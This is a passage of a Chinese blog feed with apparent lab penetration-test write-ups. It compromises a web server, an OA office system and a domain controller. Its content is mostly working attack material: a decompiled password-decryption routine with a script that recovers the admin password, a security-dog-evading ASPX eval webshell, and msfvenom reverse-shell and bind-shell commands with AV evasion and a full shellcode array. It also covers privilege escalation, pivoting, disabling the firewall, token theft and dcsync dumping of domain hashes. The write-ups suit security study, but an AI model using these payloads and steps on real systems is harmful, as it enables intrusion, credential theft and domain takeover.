class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">goto</span> IL_7B;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    flag2 = (passwordFormat != EPasswordFormat.Hashed);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!flag2)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">goto</span> IL_88;</span><br><span class="line">                &#125;</span><br><span class="line">                flag2 = (passwordFormat != EPasswordFormat.Encrypted);</span><br><span class="line">                <span class="keyword">if</span> (flag2)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">goto</span> IL_32;</span><br><span class="line">                &#125;</span><br><span class="line">                desencryptor = <span class="keyword">new</span> DESEncryptor();		<span class="comment">// 创建 DESEncryptor 对象</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ((flag2 ? <span class="number">1U</span> : <span class="number">0U</span>) + (flag2 ? <span class="number">1U</span> : <span class="number">0U</span>) &lt; <span class="number">0U</span>);</span><br><span class="line">            desencryptor.InputString = password;</span><br><span class="line">            desencryptor.DecryptKey = passwordSalt;</span><br><span class="line">            flag = ((flag2 ? <span class="number">1U</span> : <span class="number">0U</span>) &lt; <span class="number">0U</span>);</span><br><span class="line">            <span class="keyword">if</span> (flag)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">goto</span> IL_22;</span><br><span class="line">            IL_7B:</span><br><span class="line">            <span class="keyword">goto</span> IL_32;</span><br><span class="line">            IL_88:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">&quot;can not decode hashed password&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> IL_32;</span><br><span class="line">    &#125;</span><br><span class="line">    IL_22:</span><br><span class="line">    desencryptor.DesDecrypt();			<span class="comment">// 调用 DesDecrypt 方法</span></span><br><span class="line">    text = desencryptor.OutString;</span><br><span class="line">    IL_32:</span><br><span class="line">    result = text;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">BaiRong.Core.Cryptography</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// Token: 0x020001A0 RID: 416</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">class</span> <span class="title">DESEncryptor</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// Token: 0x170003B6 RID: 950</span></span><br><span class="line">		<span class="comment">// (get) Token: 0x06001064 RID: 4196 RVA: 0x000DF058 File Offset: 0x000DE058</span></span><br><span class="line">		<span class="comment">// (set) Token: 0x06001065 RID: 4197 RVA: 0x000DF070 File Offset: 0x000DE070</span></span><br><span class="line">		<span class="keyword">public</span> <span class="built_in">string</span> InputString			<span class="comment">// password</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">get</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">this</span>.x3c811436980dcf17;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">set</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">this</span>.x3c811436980dcf17 = <span class="keyword">value</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">// Token: 0x170003BB RID: 955</span></span><br><span class="line">		<span class="comment">// (get) Token: 0x0600106E RID: 4206 RVA: 0x000DF10C File Offset: 0x000DE10C</span></span><br><span class="line">		<span class="comment">// (set) Token: 0x0600106F RID: 4207 RVA: 0x000DF124 File Offset: 0x000DE124</span></span><br><span class="line">		<span class="keyword">public</span> <span class="built_in">string</span> DecryptKey			<span class="comment">// passwordSalt</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">get</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">this</span>.x6d0b493f217f133b;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">set</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">this</span>.x6d0b493f217f133b = <span class="keyword">value</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">// ... ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Token: 0x06001074 RID: 4212 RVA: 0x000DF278 File Offset: 0x000DE278</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">DesDecrypt</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">byte</span>[] rgbIV = <span class="keyword">new</span> <span class="built_in">byte</span>[]</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">18</span>,</span><br><span class="line">        <span class="number">52</span>,</span><br><span class="line">        <span class="number">86</span>,</span><br><span class="line">        <span class="number">120</span>,</span><br><span class="line">        <span class="number">144</span>,</span><br><span class="line">        <span class="number">171</span>,</span><br><span class="line">        <span class="number">205</span>,</span><br><span class="line">        <span class="number">239</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">byte</span>[] array = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="keyword">this</span>.x3c811436980dcf17.Length];			<span class="comment">// password</span></span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">byte</span>[] bytes = Encoding.UTF8.GetBytes(<span class="keyword">this</span>.x6d0b493f217f133b.Substring(<span class="number">0</span>, <span class="number">8</span>));			<span class="comment">// passwordSalt</span></span><br><span class="line">        DESCryptoServiceProvider descryptoServiceProvider = <span class="keyword">new</span> DESCryptoServiceProvider();</span><br><span class="line">        array = Convert.FromBase64String(<span class="keyword">this</span>.x3c811436980dcf17);</span><br><span class="line">        MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">        <span class="keyword">if</span> (!<span class="literal">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        CryptoStream cryptoStream = <span class="keyword">new</span> CryptoStream(memoryStream, descryptoServiceProvider.CreateDecryptor(bytes, rgbIV), CryptoStreamMode.Write);</span><br><span class="line">        cryptoStream.Write(array, <span class="number">0</span>, array.Length);</span><br><span class="line">        cryptoStream.FlushFinalBlock();</span><br><span class="line">        Encoding encoding = <span class="keyword">new</span> UTF8Encoding();</span><br><span class="line">        <span class="keyword">this</span>.xc7d800b8a71773fd = encoding.GetString(memoryStream.ToArray());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.x456956327593d9f6 = ex.Message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过分析我们已经基本确定了加密的流程，接下来编写脚本进行解密。</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DesDecryptProgram</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">DesDecrypt</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> password = <span class="string">&quot;64Cic1ERUP9n2OzxuKl9Tw==&quot;</span>;</span><br><span class="line">            <span class="built_in">string</span> passwordSalt = <span class="string">&quot;LIywB/zHFDTuEA1LU53Opg==&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">byte</span>[] rgbIV = <span class="keyword">new</span> <span class="built_in">byte</span>[]</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="number">18</span>,</span><br><span class="line">                <span class="number">52</span>,</span><br><span class="line">                <span class="number">86</span>,</span><br><span class="line">                <span class="number">120</span>,</span><br><span class="line">                <span class="number">144</span>,</span><br><span class="line">                <span class="number">171</span>,</span><br><span class="line">                <span class="number">205</span>,</span><br><span class="line">                <span class="number">239</span></span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="built_in">byte</span>[] array = <span class="keyword">new</span> <span class="built_in">byte</span>[password.Length];</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">byte</span>[] bytes = Encoding.UTF8.GetBytes(passwordSalt.Substring(<span class="number">0</span>, <span class="number">8</span>));</span><br><span class="line">                DESCryptoServiceProvider descryptoServiceProvider = <span class="keyword">new</span> DESCryptoServiceProvider();</span><br><span class="line">                array = Convert.FromBase64String(password);</span><br><span class="line">                MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">                <span class="keyword">if</span> (!<span class="literal">false</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                &#125;</span><br><span class="line">                CryptoStream cryptoStream = <span class="keyword">new</span> CryptoStream(memoryStream, descryptoServiceProvider.CreateDecryptor(bytes, rgbIV), CryptoStreamMode.Write);</span><br><span class="line">                cryptoStream.Write(array, <span class="number">0</span>, array.Length);</span><br><span class="line">                cryptoStream.FlushFinalBlock();</span><br><span class="line">                Encoding encoding = <span class="keyword">new</span> UTF8Encoding();</span><br><span class="line">                Console.WriteLine(encoding.GetString(memoryStream.ToArray()));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(ex.Message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            DesDecrypt();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230714142356035.png" alt="image-20230714142356035"></p>
<p>得到了管理员 admin 的密码为 admin5566。</p>
<p>接下来就是进入网站后台上传模板拿shell，由于存在安全狗，所以需要绕过。网上找了一些过狗的 aspx 木马，发现都没有成功，最终还是采用了暗月佬的过狗木马。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">var a = Request.Item[&quot;c32as&quot;];</span><br><span class="line">a = a.Replace(&quot;moonmoonmoonmm&quot;,&quot;Response.Write&quot;);</span><br><span class="line">// Response.Write(a);</span><br><span class="line">eval(a, &quot;unsafe&quot;);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230714161813926.png" alt="image-20230714161813926"></p>
<p>接下来的工作就是进行提权。利用<code>PrintSpoofer</code>工具进行提权，根据 github 上的介绍，该工具是用于在 Windows 10 和 Windows Server 2016&#x2F;2019 上将 local&#x2F;network service 权限提升至 system 权限，而且免杀率挺高的。</p>
<blockquote>
<p><a href="https://github.com/itm4n/PrintSpoofer">itm4n&#x2F;PrintSpoofer: Abusing Impersonation Privileges on Windows 10 and Server 2019 (github.com)</a></p>
</blockquote>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230714164845855.png" alt="image-20230714164845855"></p>
<p>接下来是利用 msf 生成一个免杀的 shellcode，然后使用加载器生成二进制文件即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.128 lport=2333 -e x86/shikata_ga_nai -i 15 -f csharp -o payload.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-e 指定编码器</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-i 指定编码的次数</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-f 指定输出格式，这里是C语言格式</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">byte[] buf = new byte[759] &#123;0xda,0xc5,0xd9,0x74,0x24,0xf4,</span><br><span class="line">0xbe,0x3c,0x6a,0x3a,0x70,0x5f,0x2b,0xc9,0xb1,0xb8,0x31,0x77,</span><br><span class="line">0x17,0x03,0x77,0x17,0x83,0xd3,0x96,0xd8,0x85,0xf2,0xa6,0xa7,</span><br><span class="line">0x50,0xb6,0xc7,0x52,0x45,0xc2,0x33,0x97,0x28,0x01,0xf5,0xe6,</span><br><span class="line">0x64,0x64,0x53,0x11,0x84,0xd0,0x43,0xa2,0x64,0x16,0x23,0xbf,</span><br><span class="line">0x2b,0x5d,0xe9,0x66,0x7e,0xcc,0x7b,0x63,0xc3,0xbb,0x9a,0x37,</span><br><span class="line">0x45,0xbf,0xd5,0xce,0xa1,0x06,0xbb,0xaa,0xe1,0xb9,0x69,0x7a,</span><br><span class="line">0x27,0x2f,0x7e,0x1f,0x34,0x43,0x15,0xdf,0x71,0x1b,0xa0,0x6f,</span><br><span class="line">0x43,0x87,0xcf,0xb0,0xc1,0x3e,0x20,0xe0,0x44,0xbe,0x26,0xdd,</span><br><span class="line">0xa6,0xd2,0x85,0x28,0xa3,0x94,0xe7,0xbe,0xf5,0x94,0x0e,0x43,</span><br><span class="line">0x2e,0xbb,0xb1,0x89,0x3f,0xe6,0xbe,0x4f,0xec,0xbd,0xcb,0xff,</span><br><span class="line">0x23,0x65,0x93,0x93,0xcd,0xcd,0xb4,0xe5,0xc0,0xef,0xb9,0x6f,</span><br><span class="line">0xce,0xb5,0x20,0x80,0x18,0x59,0xcf,0x07,0x44,0x0a,0xea,0x1b,</span><br><span class="line">0x4a,0x3b,0xba,0x6e,0xa8,0xf4,0xce,0x78,0xf9,0xcd,0x22,0xb4,</span><br><span class="line">0xb5,0xf1,0x23,0xf8,0xd1,0x24,0x80,0x68,0x26,0xb3,0x07,0x25,</span><br><span class="line">0x68,0x85,0xba,0xaf,0x80,0x5d,0x70,0x13,0xf4,0xea,0x38,0x80,</span><br><span class="line">0xfc,0x09,0x93,0xb2,0x76,0x06,0x28,0x9c,0x1c,0xea,0xfa,0xc3,</span><br><span class="line">0xf0,0x7a,0x2b,0x7d,0x04,0x02,0x57,0x30,0xa4,0x88,0x44,0xf6,</span><br><span class="line">0x32,0x5a,0x0e,0x2e,0xfb,0xba,0x69,0x7f,0x9c,0x53,0x91,0xda,</span><br><span class="line">0x8c,0xd9,0x37,0x55,0xe7,0x91,0xa8,0x1f,0xd2,0x14,0x4c,0x73,</span><br><span class="line">0x48,0xfd,0xf7,0xa4,0xb4,0xd1,0x6f,0x65,0x10,0x51,0x7c,0xd6,</span><br><span class="line">0xcd,0x56,0xa2,0x13,0x15,0xdf,0x4a,0xe5,0x30,0x9a,0x62,0x1e,</span><br><span class="line">0x18,0x67,0xd6,0xde,0xa6,0x90,0xb7,0x02,0x95,0x4d,0x60,0xd2,</span><br><span class="line">0x99,0x7c,0x37,0x4b,0x57,0x96,0xf3,0xc9,0x4e,0x2f,0x7f,0x2b,</span><br><span class="line">0xbc,0x35,0x46,0x0a,0x29,0xe4,0x8c,0x6d,0xd4,0x71,0x4c,0x88,</span><br><span class="line">0x08,0xb7,0x3b,0xe2,0x86,0x73,0x5b,0xf9,0x87,0xb8,0x49,0xd3,</span><br><span class="line">0xe5,0x64,0x3d,0xeb,0x2d,0xe4,0x74,0x49,0x83,0x5a,0xc0,0x01,</span><br><span class="line">0x28,0x55,0xbc,0x06,0xe1,0x9f,0x26,0xfb,0x3e,0xcc,0xa3,0xbb,</span><br><span class="line">0x33,0x07,0x89,0x52,0x56,0x12,0x60,0x6c,0xd6,0xdd,0x85,0x4e,</span><br><span class="line">0xe3,0x54,0xe8,0x44,0x02,0xc8,0x1a,0xcb,0xc9,0xd4,0xd7,0x46,</span><br><span class="line">0x4b,0x7b,0x18,0xe5,0xbe,0x3d,0x16,0x32,0xac,0xed,0x6a,0x06,</span><br><span class="line">0xb6,0xf4,0x8a,0x91,0x2b,0xd2,0x3b,0x52,0x5e,0x5d,0x24,0x22,</span><br><span class="line">0x85,0x9c,0xa8,0x93,0xd4,0x5b,0x00,0x4d,0xb2,0x18,0x0a,0xbd,</span><br><span class="line">0x6e,0x8c,0xc4,0x26,0x37,0x09,0xd0,0xc7,0x7b,0x3d,0x5a,0x56,</span><br><span class="line">0x37,0x44,0x85,0xc8,0x4a,0xf0,0x28,0xef,0x72,0x01,0x98,0xe5,</span><br><span class="line">0x18,0xd4,0x4d,0x52,0xf5,0x4b,0x9a,0x19,0x62,0x98,0x26,0xe2,</span><br><span class="line">0x62,0x30,0xf2,0xc1,0xa6,0x1c,0xef,0xbe,0x65,0xbb,0x26,0xb1,</span><br><span class="line">0x57,0xa5,0x6b,0x88,0x77,0x9b,0x3e,0x83,0x0c,0x8a,0xc1,0xcd,</span><br><span class="line">0xd8,0xea,0x0b,0x1d,0x06,0xc5,0x55,0x5a,0x41,0x3b,0xe6,0x06,</span><br><span class="line">0xa9,0xf7,0x3a,0x8d,0xe0,0xea,0x80,0x37,0xbe,0xc6,0x65,0x1b,</span><br><span class="line">0x94,0xa2,0x49,0xfc,0xdd,0x43,0xb4,0x9a,0x54,0x69,0x3b,0x44,</span><br><span class="line">0x53,0x15,0x50,0xc0,0x55,0xfb,0xba,0x27,0xd5,0xe3,0xd3,0xc3,</span><br><span class="line">0xc3,0x7b,0x46,0x71,0x1e,0x60,0x6d,0x1a,0xdc,0xca,0x8e,0x2f,</span><br><span class="line">0x09,0x01,0x9f,0xea,0xc4,0x9e,0x31,0xe7,0xc1,0x30,0x74,0x9b,</span><br><span class="line">0xe6,0xa2,0x7d,0x34,0x4e,0xec,0x87,0x33,0xd0,0xf7,0xd1,0x53,</span><br><span class="line">0xef,0x32,0xcd,0xe3,0xeb,0x8b,0x4d,0x1a,0x4d,0x1e,0x5c,0xc1,</span><br><span class="line">0xa0,0xde,0xc7,0x20,0x70,0x05,0x40,0x29,0xd2,0x8a,0x38,0x3b,</span><br><span class="line">0x71,0x89,0x4f,0x0b,0x4e,0x6b,0xe9,0x88,0x23,0x42,0xa6,0x7e,</span><br><span class="line">0x49,0x9f,0x0a,0xd1,0x98,0xde,0xba,0x6f,0x11,0x28,0x89,0x79,</span><br><span class="line">0x86,0x44,0xe6,0x81,0x47,0x9b,0xfa,0x74,0x91,0xe1,0xc8,0x54,</span><br><span class="line">0xfd,0x61,0x34,0x6a,0xe5,0xb8,0x90,0x11,0x5d,0xf0,0x83,0xec,</span><br><span class="line">0x23,0x91,0x46,0xf2,0xc1,0x00,0xff,0xa1,0x4d,0xe2,0xb2,0xff,</span><br><span class="line">0x4d,0xcc,0xe5,0x81,0x24,0xb0,0x61,0xac,0xf9,0xa8,0x79,0xd0,</span><br><span class="line">0xa7,0x10,0x78,0xf0,0x77,0x2c,0x6c,0xc3,0x6b,0xcf,0xc4,0xd1,</span><br><span class="line">0x49,0xcf,0xc4,0xf6,0x82,0x3e,0x94,0x9b,0xdc,0x6c,0x7e,0xf4,</span><br><span class="line">0x96,0xc2,0x3d,0xaf,0x74,0xa0,0x91,0xe5,0x09,0xa1,0x92,0x62,</span><br><span class="line">0x07,0x3c,0x5b,0xae,0xfb,0xc1,0x09,0x07,0x8c,0x9c,0x61,0x5f,</span><br><span class="line">0x4b,0xf7,0x25,0xba,0x1d,0xc0,0x27,0x08,0x3f,0x49,0x6d,0xfa,</span><br><span class="line">0xaa,0x5a,0x5c,0xf0,0x46,0xe1,0xf7,0x62,0xa6,0xfd,0x26,0xe1,</span><br><span class="line">0xc7,0xcd,0xa8,0x6d,0xa4,0x8f,0x8f,0x86,0x9a,0xe8,0xd2,0xc4,</span><br><span class="line">0x11,0x9e,0x17,0x9a,0xa7,0x26,0xb3,0x18,0xd1,0xdb,0x3c,0x02,</span><br><span class="line">0x22,0x3a,0x99,0x44,0x6b,0x25,0x28,0x65,0x83,0x77,0x84,0x6a,</span><br><span class="line">0x28,0xbc,0xa4,0xec,0xcb,0x85,0x0b,0x69,0xc6,0x18,0x7a,0x5c,</span><br><span class="line">0xeb,0x31,0x00,0x96,0xe6,0x85,0x07,0x31,0x40&#125;;</span><br></pre></td></tr></table></figure>

<p>成功提权！</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230715123253518.png" alt="image-20230715123253518"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230715125243041.png" alt="image-20230715125243041"></p>
<p>在 Kali 中尝试用 rdesktop 进行远程桌面登录，发现失败。通过网上资料查询，使用<code>remmina</code>进行登录，可以成功。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.1.%I | findstr &quot;TTL=&quot;		# 目标机 ICMP 服务未开扫不到</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run post/windows/gather/arp_scanner rhosts=10.10.1.0/24</span><br></pre></td></tr></table></figure>



<h2 id="OA办公系统"><a href="#OA办公系统" class="headerlink" title="OA办公系统"></a>OA办公系统</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 10.10.1.0/24</span><br><span class="line">msf6 exploit(multi/handler) &gt; use auxiliary/server/socks_proxy</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; run</span><br><span class="line"></span><br><span class="line">vim /etc/proxychains4.conf			# 设置代理的IP和端口</span><br><span class="line">proxychains nmap -sT -Pn 10.10.1.130</span><br><span class="line">proxychains nmap -sT -Pn 10.10.1.130 -p 80,89,8000,9090,1433,1521,3306,5432,445,135,443,873,5984,6379,7001,7002,9200,9300,11211,27017,27018,50000,50070,50030,21,22,23,2601,3389 --open				# 扫描常用端口</span><br></pre></td></tr></table></figure>

<p>只能成功扫描到 80 端口，应该是防火墙做了拦截。访问 80 端口，发现是通达的办公系统，通过网上的搜索找到相关的漏洞和项目。<strong>注意：进行测试时不能忘了给工具挂上代理</strong>。</p>
<blockquote>
<p><a href="https://github.com/kitezzzGrim/tongda-exp">kitezzzGrim&#x2F;tongda-exp: python编写的多个通达常见漏洞exp (github.com)</a></p>
</blockquote>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230715150612963.png" alt="image-20230715150612963"></p>
<p>上面的项目成功写入了 webshell，同时返回给了我们地址和密码。我开始尝试用蚁剑进行连接，但是给我报错，显示<strong>返回数据为空</strong>，说明连接成功了但是拿不到 shell，推测是项目的 webshell 不适配蚁剑。接下来尝试用冰蝎进行连接，发现成功。或者，可以使用蚁剑的插件生成 webshell，同时替换项目脚本中的 webshell，那么也能够成功。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230715151101438.png" alt="image-20230715151101438"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">本机信息搜集</span></span><br><span class="line">systeminfo</span><br><span class="line">net start</span><br><span class="line">tasklist</span><br><span class="line">netstat -nao</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off		# 关闭 Windows Firewall</span><br></pre></td></tr></table></figure>

<p>关闭防火墙之后发现除 80 端口之外的端口也可以访问了，同时可以正向连接这台办公系统了。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230715153047589.png" alt="image-20230715153047589"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp lport=6666 -e x86/shikata_ga_nai -i 15 -f csharp -o payload_bind.txt</span><br></pre></td></tr></table></figure>

<p>和第一台主机一样的操作，发现上传成功，同时免杀360全家桶。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230715154555067.png" alt="image-20230715154555067"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_domain			# 定位域控</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_logged_on_users			# 查看登录用户</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_ad_groups			# 查看组信息</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230715161243227.png" alt="image-20230715161243227"></p>
<h2 id="DC域控"><a href="#DC域控" class="headerlink" title="DC域控"></a>DC域控</h2><p>设置静态路由后开扫，结果如下。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230715162056745.png" alt="image-20230715162056745"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; steal_token 4572		# 窃取域管理员的 token</span><br><span class="line">meterpreter &gt; dcsync_ntlm administrator</span><br><span class="line">meterpreter &gt; dcsync_ntlm krbtgt</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230715162933566.png" alt="image-20230715162933566"></p>
<blockquote>
<p>mimikatz 免杀 360全家桶：<a href="https://github.com/ssssanr/Mimikatz-Csharp">ssssanr&#x2F;Mimikatz-Csharp (github.com)</a></p>
</blockquote>
<p>拿到了域管理员的 NTML，尝试 pth 攻击，但是失败。发现 3389 端口开放，直接在线破解哈希远程登录。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230715170358293.png" alt="image-20230715170358293"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230715171047820.png" alt="image-20230715171047820"></p>
]]></content>
      <categories>
        <category>Penetration</category>
      </categories>
      <tags>
        <tag>暗月</tag>
      </tags>
  </entry>
  <entry>
    <title>初探内网域渗透</title>
    <url>/2023/06/26/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD/</url>
    <content><![CDATA[<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过暗月六的项目，了解了域内的基本知识，掌握了<code>mimikatz</code>工具的基本使用，学习了 Kerberos 的简单攻击（包括 PAC 攻击和黄金票据的生成上传），同时也接触了 Metasploit 的更多模块，最后还尝试了使用 CS 进行域渗透。</p>
<blockquote>
<p>参考文章：<a href="https://www.freebuf.com/articles/network/245872.html">内网横向移动：Kerberos认证与(哈希)票据传递攻击 - FreeBuf网络安全行业门户</a></p>
</blockquote>
<p>最后也是跟着暗月佬拿下了一台Web主机和一台DC。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230626132522994.png" alt="image-20230626132522994"></p>
<span id="more"></span>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo masscan -p 1-65535 192.168.8.139 --rate=10000</span><br><span class="line">nmap -p 49152,3389,49153,49159,3306,80,47001,139,49155,49154,135,49156,445 -sC -A 192.168.8.139</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230530163822259.png" alt="image-20230530163822259"></p>
<h2 id="网站测试"><a href="#网站测试" class="headerlink" title="网站测试"></a>网站测试</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whatweb http://www.webhack123.com/</span><br><span class="line">dirsearch -u &quot;http://www.webhack123.com/&quot; -e * -x 400-499 -t 50</span><br></pre></td></tr></table></figure>

<p>发现存在<code>.svn</code>泄露，访问 &#x2F;.svn&#x2F;entries 或者是 &#x2F;.svn&#x2F;wc.db 文件可以获得服务器源码等信息。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用工具得到网站源码</span></span><br><span class="line">git clone https://github.com/kost/dvcs-ripper.git</span><br><span class="line">./rip-svn.pl -v -u http://www.webhack123.com/.svn/</span><br></pre></td></tr></table></figure>

<p>发现日志文件，thinkphp 低版本在会记录修改密码的日志，所以可以找到管理员的密码。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230530195835505.png" alt="image-20230530195835505"></p>
<p>本来以为已经找到了密码，解一下是 123456，但是看完视频才发现通过 .svn 恢复的日志文件不全，存在更新的。学习暗月佬写了一个脚本来收集相关的日志记录，找到了最新的密码记录。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230530200008802.png" alt="image-20230530200008802"></p>
